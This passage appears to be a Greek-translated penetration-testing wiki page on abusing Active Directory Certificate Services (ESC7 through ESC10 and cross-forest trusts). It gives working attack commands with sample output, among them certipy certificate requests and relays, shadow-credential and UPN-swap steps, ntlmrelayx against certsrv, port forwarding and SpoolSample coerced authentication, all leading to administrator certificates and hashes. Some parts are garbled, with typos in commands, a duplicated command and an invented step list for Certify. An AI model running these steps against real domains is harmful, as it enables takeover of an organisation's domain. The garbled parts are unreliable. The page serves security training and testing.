certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Με τις εντολές **`Manage CA` και `Manage Certificates`**, μπορούμε στη συνέχεια να **εκδώσουμε το αποτυχημένο πιστοποιητικό** αίτησης με την εντολή `ca` και την παράμετρο `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Και τελικά, μπορούμε να **ανακτήσουμε το εκδοθέν πιστοποιητικό** με την εντολή `req` και την παράμετρο `-retrieve <αναγνωριστικό αίτησης>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay σε τα HTTP σημεία πρόσβασης του AD CS - ESC8

### Εξήγηση

{% hint style="info" %}
Σε περιβάλλοντα όπου έχει εγκατασταθεί το **AD CS**, εάν υπάρχει ένα ευάλωτο **σημείο πρόσβασης για την ιστοσελίδα εγγραφής** και έχει δημοσιευτεί τουλάχιστον ένα **πρότυπο πιστοποιητικού** που επιτρέπει την **εγγραφή υπολογιστή του τομέα και την πιστοποίηση του πελάτη** (όπως το προεπιλεγμένο πρότυπο **`Machine`**), γίνεται δυνατή η **διαρροή ενός υπολογιστή από έναν επιτιθέμενο**!
{% endhint %}

Το AD CS υποστηρίζει αρκετές **μέθοδοι εγγραφής βασισμένες σε HTTP**, που είναι διαθέσιμες μέσω επιπρόσθετων ρόλων διακομιστή που οι διαχειριστές μπορούν να εγκαταστήσουν. Αυτές οι διεπαφές για την εγγραφή πιστοποιητικών μέσω HTTP είναι ευάλωτες σε **επιθέσεις NTLM relay**. Ένας επιτιθέμενος, από ένα **επιτεθέν μηχάνημα, μπορεί να προσομοιώσει οποιονδήποτε λογαριασμό AD που πιστοποιείται μέσω εισερχόμενου NTLM**. Προσομοιώνοντας τον λογαριασμό θύμα, ο επιτιθέμενος μπορεί να αποκτήσει πρόσβαση σε αυτές τις ιστοσελίδες για να **ζητήσει ένα πιστοποιητικό πιστοποίησης πελάτη χρησιμοποιώντας τα πρότυπα πιστοποιητικών `User` ή `Machine`**.

* Η **ιστοσελίδα εγγραφής** (μια παλαιότερη εφαρμογή ASP διαθέσιμη στο `http://<caserver>/certsrv/`), προεπιλέγει μόνο το πρωτόκολλο HTTP, το οποίο δεν προσφέρει προστασία από επιθέσεις NTLM relay. Επιπλέον, επιτρέπει μόνο την πιστοποίηση NTLM μέσω της κεφαλίδας HTTP Authorization, καθιστώντας ανεφάρμοστες πιο ασφαλείς μεθόδους πιστοποίησης όπως το Kerberos.
* Ο **Υπηρεσία Εγγραφής Πιστοποιητικού** (CES), η **Υπηρεσία Πολιτικής Εγγραφής Πιστοποιητικού** (CEP) και η **Υπηρεσία Εγγραφής Συσκευής Δικτύου** (NDES) υποστηρίζουν από προεπιλογή την αυθεντικοποίηση μέσω διαπραγμάτευσης μέσω της κεφαλίδας HTTP Authorization. Η αυθεντικοποίηση διαπραγμάτευσης υποστηρίζει τόσο το Kerberos όσο και το NTLM, επιτρέποντας σε έναν επιτιθέμενο να υποβαθμίσει την αυθεντικοποίηση σε NTLM κατά τη διάρκεια επιθέσεων relay. Αν και αυτές οι υπηρεσίες υποστηρίζουν προεπιλογή HTTPS, το HTTPS μόνο του **δεν προστατεύει από επιθέσεις NTLM relay**. Η προστασία από επιθέσεις NTLM relay για υπηρεσίες HTTPS είναι δυνατή μόνο όταν συνδυάζεται το HTTPS με τη σύνδεση καναλιού. Δυστυχώς, το AD CS δεν ενεργοποιεί την Επέκταση Προστασίας για Αυθεντικοποίηση στο IIS, η οποία απαιτείται για τη σύνδεση καναλιού.

Ένα κοινό πρόβλημα με τις επιθέσεις NTLM relay είναι η **σύντομη διάρκεια των συνεδριών NTLM** και η αδυναμία του επιτιθέμενου να αλληλεπιδράσει με υπηρεσίες που **απαιτούν NTLM signing**.

Ωστόσο, αυτό το περιορισμό ξεπερνιέται εκμεταλλευόμενος μια επίθεση NTLM relay για να αποκτήσει ένα πιστοποιητικό για τον χρήστη, καθώς η περίοδος ισχύος του πιστοποιητικού καθορίζει τη διάρκεια της συνεδρίας και το πιστοποιητικό μπορεί να χρησιμοποιηθεί με υπηρεσίες που **απαιτούν NTLM signing**. Για οδηγίες για τη χρήση ενός κλεμμένου πιστοποιητικού, ανατρέξτε στο:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Ένας άλλος περιορισμός των επιθέσεων NTLM relay είναι ότι **ένα μηχάνημα που ελέγχεται από τον επιτιθέμενο πρέπει να έχει πιστοποίηση από έναν λογαριασμό θύμα**. Ο επιτιθέμενος μπορεί είτε να περιμένει είτε να προσπαθήσει να **αναγκάσει** αυτήν την πιστοποίηση:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Κατάχρηση

Το `cas` του [**Certify**](https://github.com/GhostPack/Certify) απαριθμεί τα **ενεργοποιημένα σημεία πρόσβασης HTTP του AD CS**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Η ιδιότητα `msPKI-Enrollment-Servers` χρησιμοποιείται από επιχειρησιακές Αρχές Πιστοποίησης (CAs) για να αποθηκεύουν τα άκρα εξυπηρέτησης Υπηρεσίας Εγγραφής Πιστοποιητικών (CES). Αυτά τα άκρα μπορούν να αναλυθούν και να καταχωρηθούν χρησιμοποιώντας το εργαλείο **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Κατάχρηση με το Certify

Η κατάχρηση με το Certify είναι μια τεχνική που εκμεταλλεύεται τις αδυναμίες στη διαχείριση πιστοποιητικών στο περιβάλλον του Active Directory. Αυτή η τεχνική μπορεί να οδηγήσει σε ανέπαφη αύξηση δικαιωμάτων στο περιβάλλον του AD.

Οι βήματα για την κατάχρηση με το Certify είναι:

1. Εγκατάσταση του Certify στον ελεγκτή του τομέα (Domain Controller).
2. Συλλογή πιστοποιητικών από τον ελεγκτή του τομέα.
3. Ανάλυση των πιστοποιητικών για την εύρεση ευπαθειών.
4. Εκμετάλλευση των ευπαθειών για την αύξηση δικαιωμάτων.

Η κατάχρηση με το Certify είναι μια ισχυρή τεχνική που μπορεί να χρησιμοποιηθεί για την επέκταση των δικαιωμάτων σε ένα περιβάλλον Active Directory. Είναι σημαντικό να είμαστε προσεκτικοί και να λαμβάνουμε τα κατάλληλα μέτρα ασφαλείας για να προστατεύσουμε το περιβάλλον μας από αυτήν την επίθεση.
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Κατάχρηση με το [Certipy](https://github.com/ly4k/Certipy)

Η αίτηση για ένα πιστοποιητικό γίνεται από το Certipy από προεπιλογή βασισμένη στο πρότυπο `Machine` ή `User`, που καθορίζεται από το αν το όνομα λογαριασμού που προωθείται τελειώνει σε `$`. Η καθορισμός εναλλακτικού προτύπου μπορεί να επιτευχθεί μέσω της χρήσης της παραμέτρου `-template`.

Έπειτα, μπορεί να χρησιμοποιηθεί μια τεχνική όπως το [PetitPotam](https://github.com/ly4k/PetitPotam) για να εξαναγκαστεί η ταυτοποίηση. Όταν ασχολούμαστε με ελεγκτές του τομέα, απαιτείται η καθορισμός της παραμέτρου `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Επέκταση χωρίς ασφάλεια - ESC9 <a href="#5485" id="5485"></a>

### Εξήγηση

Η νέα τιμή **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) για το **`msPKI-Enrollment-Flag`**, γνωστή και ως ESC9, αποτρέπει την ενσωμάτωση της **νέας επέκτασης ασφαλείας `szOID_NTDS_CA_SECURITY_EXT`** σε ένα πιστοποιητικό. Αυτή η σημαία γίνεται σημαντική όταν η ρύθμιση `StrongCertificateBindingEnforcement` είναι ίση με `1` (η προεπιλεγμένη ρύθμιση), σε αντίθεση με την ρύθμιση `2`. Η σημασία της αυξάνεται σε περιπτώσεις όπου μπορεί να εκμεταλλευτείται μια αδύναμη αντιστοίχιση πιστοποιητικού για το Kerberos ή το Schannel (όπως στο ESC10), καθώς η απουσία του ESC9 δεν θα επηρεάσει τις απαιτήσεις.

Οι περιπτώσεις υπό τις οποίες η ρύθμιση αυτής της σημαίας γίνεται σημαντική περιλαμβάνουν:
- Η ρύθμιση `StrongCertificateBindingEnforcement` δεν έχει προσαρμοστεί σε `2` (με την προεπιλεγμένη τιμή να είναι `1`), ή η `CertificateMappingMethods` περιλαμβάνει τη σημαία `UPN`.
- Το πιστοποιητικό είναι σημειωμένο με τη σημαία `CT_FLAG_NO_SECURITY_EXTENSION` εντός της ρύθμισης `msPKI-Enrollment-Flag`.
- Το πιστοποιητικό καθορίζει οποιαδήποτε EKU για την επαλήθευση του πελάτη.
- Υπάρχουν δικαιώματα `GenericWrite` σε οποιονδήποτε λογαριασμό για να διακινδυνεύσει έναν άλλο.

### Σενάριο κατάχρησης

Ας υποθέσουμε ότι ο `John@corp.local` έχει δικαιώματα `GenericWrite` πάνω στον `Jane@corp.local`, με στόχο να διακινδυνεύσει τον `Administrator@corp.local`. Ο πρότυπο πιστοποιητικού `ESC9`, στο οποίο ο `Jane@corp.local` έχει άδεια να εγγραφεί, έχει ρυθμιστεί με τη σημαία `CT_FLAG_NO_SECURITY_EXTENSION` στη ρύθμιση `msPKI-Enrollment-Flag`.

Αρχικά, ο κατακερματισμός του `Jane` αποκτάται χρησιμοποιώντας τα Σκιώδη Διαπιστευτήρια, χάρη στο `GenericWrite` του `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Στη συνέχεια, η `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, προσποιούμενη τον αποκλεισμό του τμήματος του τομέα `@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Αυτή η τροποποίηση δεν παραβιάζει τους περιορισμούς, δεδομένου ότι το `Administrator@corp.local` παραμένει διακριτό ως `userPrincipalName` του `Administrator`.

Ακολουθώντας αυτό, ο πιστοποιητικός πρότυπο `ESC9`, που έχει επισημανθεί ως ευάλωτο, ζητείται ως `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Σημειώνεται ότι το `userPrincipalName` του πιστοποιητικού αντικατοπτρίζει το `Administrator`, χωρίς κανένα "object SID".

Το `userPrincipalName` της `Jane` επαναφέρεται στο αρχικό της, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η προσπάθεια πιστοποίησης με το εκδοθέν πιστοποιητικό παράγει τώρα το NT hash του `Administrator@corp.local`. Η εντολή πρέπει να περιλαμβάνει το `-domain <domain>` λόγω της έλλειψης προδιαγραφής του πιστοποιητικού για τον τομέα:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Αδύναμες αντιστοιχίσεις πιστοποιητικών - ESC10

### Εξήγηση

Οι τιμές δύο κλειδιών μητρώου στον ελεγκτή του τομέα αναφέρονται από το ESC10:

- Η προεπιλεγμένη τιμή για το `CertificateMappingMethods` κάτω από το `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` είναι `0x18` (`0x8 | 0x10`), προηγουμένως ορισμένη ως `0x1F`.
- Η προεπιλεγμένη ρύθμιση για το `StrongCertificateBindingEnforcement` κάτω από το `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` είναι `1`, προηγουμένως `0`.

**Περίπτωση 1**

Όταν το `StrongCertificateBindingEnforcement` έχει ρυθμιστεί σε `0`.

**Περίπτωση 2**

Εάν το `CertificateMappingMethods` περιλαμβάνει το bit `UPN` (`0x4`).

### Κατάχρηση Περίπτωσης 1

Με το `StrongCertificateBindingEnforcement` ρυθμισμένο σε `0`, ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να εκμεταλλευτεί για να διακινδυνεύσει οποιονδήποτε λογαριασμό B.

Για παράδειγμα, έχοντας δικαιώματα `GenericWrite` πάνω στον λογαριασμό `Jane@corp.local`, ένας επιτιθέμενος στοχεύει να διακινδυνεύσει τον λογαριασμό `Administrator@corp.local`. Η διαδικασία αντικατοπτρίζει το ESC9, επιτρέποντας τη χρήση οποιουδήποτε προτύπου πιστοποιητικού.

Αρχικά, η κατακερματισμένη τιμή της `Jane` ανακτάται χρησιμοποιώντας τα Shadow Credentials, εκμεταλλευόμενος το `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Στη συνέχεια, η `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, προσεκτικά παραλείποντας το τμήμα `@corp.local` για να αποφευχθεί μια παραβίαση περιορισμού.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ακολουθώντας αυτό, ζητείται ένα πιστοποιητικό που επιτρέπει την πιστοποίηση του πελάτη ως `Jane`, χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Το `userPrincipalName` της `Jane` επαναφέρεται στην αρχική του τιμή, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η πιστοποίηση με τον ληφθέντα πιστοποιητικό θα παράξει το NT hash του `Administrator@corp.local`, απαιτώντας την καθορισμό του τομέα στην εντολή λόγω της απουσίας λεπτομερειών τομέα στο πιστοποιητικό.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Περίπτωση Κατάχρησης 2

Με την παράμετρο `CertificateMappingMethods` που περιέχει την σημαία `UPN` (`0x4`), ένας λογαριασμός Α με δικαιώματα `GenericWrite` μπορεί να απειλήσει οποιονδήποτε λογαριασμό Β που δεν έχει το χαρακτηριστικό `userPrincipalName`, συμπεριλαμβανομένων των λογαριασμών μηχανήματος και του ενσωματωμένου διαχειριστή του τομέα `Administrator`.

Σε αυτήν την περίπτωση, ο στόχος είναι να απειληθεί ο λογαριασμός `DC$@corp.local`, ξεκινώντας με την απόκτηση του κατακερματισμένου κωδικού του `Jane` μέσω των Shadow Credentials, εκμεταλλευόμενος το `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Το `userPrincipalName` της `Jane` ορίζεται ως `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ζητείται ένα πιστοποιητικό για την πιστοποίηση του πελάτη ως `Jane` χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Το `userPrincipalName` της `Jane` επαναφέρεται στην αρχική του κατάσταση μετά από αυτήν τη διαδικασία.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Για να γίνει πιστοποίηση μέσω του Schannel, χρησιμοποιείται η επιλογή `-ldap-shell` του Certipy, η οποία υποδεικνύει επιτυχή πιστοποίηση ως `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Μέσω του LDAP shell, εντολές όπως `set_rbcd` επιτρέπουν επιθέσεις Resource-Based Constrained Delegation (RBCD), με δυνητική απειλή για τον ελεγκτή του τομέα.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Αυτή η ευπάθεια επεκτείνεται επίσης σε οποιονδήποτε λογαριασμό χρήστη που δεν έχει ένα `userPrincipalName` ή όπου δεν ταιριάζει με το `sAMAccountName`, με το προεπιλεγμένο `Administrator@corp.local` να είναι ένας κύριος στόχος λόγω των αυξημένων προνομίων LDAP και της απουσίας ενός `userPrincipalName` από προεπιλογή.

## Εξήγηση της παραβίασης των δασών με πιστοποιητικά μέσω παθητικής φωνής

### Θραύση των εμπιστοσύνων των δασών από παραβιασμένες CAs

Η διαμόρφωση για την **εγγραφή διασυνοριακής δασούς** γίνεται σχετικά απλή. Το **πιστοποιητικό της ρίζας CA** από το δασος πόρων δημοσιεύεται στα δάση λογαριασμών από τους διαχειριστές, και τα **πιστοποιητικά της επιχείρησης CA** από το δάσος πόρων προστίθενται στους φακέλους `NTAuthCertificates` και AIA σε κάθε δάσος λογαριασμού. Για να διευκρινιστεί, αυτή η διάταξη παρέχει στο **CA του δασούς πόρων πλήρη έλεγχο** σε όλα τα άλλα δάση για τα οποία διαχειρίζεται το PKI. Αν αυτό το CA πέσει **θύμα επιθέσεων**, τα πιστοποιητικά για όλους τους χρήστες τόσο στο δάσος πόρων όσο και στα δάση λογαριασμού μπορούν να πλαστογραφηθούν από αυτούς, παραβιάζοντας έτσι το ασφαλές όριο του δάσους.

### Προνόμια εγγραφής που χορηγούνται σε ξένους πρωταγωνιστές

Σε περιβάλλοντα με πολλά δάση, απαιτείται προσοχή όσον αφορά τα Enterprise CAs που **δημοσιεύουν πρότυπα πιστοποιητικών** που επιτρέπουν στους **Εξουσιοδοτημένους Χρήστες ή ξένους πρωταγωνιστές** (χρήστες/ομάδες εξωτερικού του δάσους στο οποίο ανήκει το Enterprise CA) **δικαίωμα εγγραφής και επεξεργασίας**.\
Μετά την πιστοποίηση σε μια εμπιστοσύνη, το SID των **Εξουσιοδοτημένων Χρηστών** προστίθεται στο διακριτικό του χρήστη από το AD. Έτσι, αν ένας τομέας διαθέτει ένα Enterprise CA με ένα πρότυπο που **επιτρέπει στους Εξουσιοδοτημένους Χρήστες δικαιώματα εγγραφής**, ένα πρότυπο θα μπορούσε πιθανώς να **εγγραφεί από έναν χρήστη από διαφορετικό δάσος**. Αντίστοιχα, αν **δικαιώματα εγγραφής χορηγούνται ρητά σε ξένο πρωταγωνιστή από ένα πρότυπο**, δημιουργείται ένας **συσχετισμός ελέγχου πρόσβασης διασυνοριακού προσβάσιμου**, επιτρέποντας σε έναν πρωταγωνιστή από ένα δάσος να **εγγραφεί σε ένα πρότυπο από ένα άλλο δάσος**.

Και οι δύο περιπτώσεις οδηγούν σε μια **αύξηση της επιθετικής επιφάνειας** από ένα δάσος σε ένα άλλο. Οι ρυθμίσεις του προτύπου πιστοποιητικού μπορούν να εκμεταλλευτούνται από έναν επιτιθέμενο για να αποκτήσει επιπλέον προνόμια σε έναν ξένο τομέα.
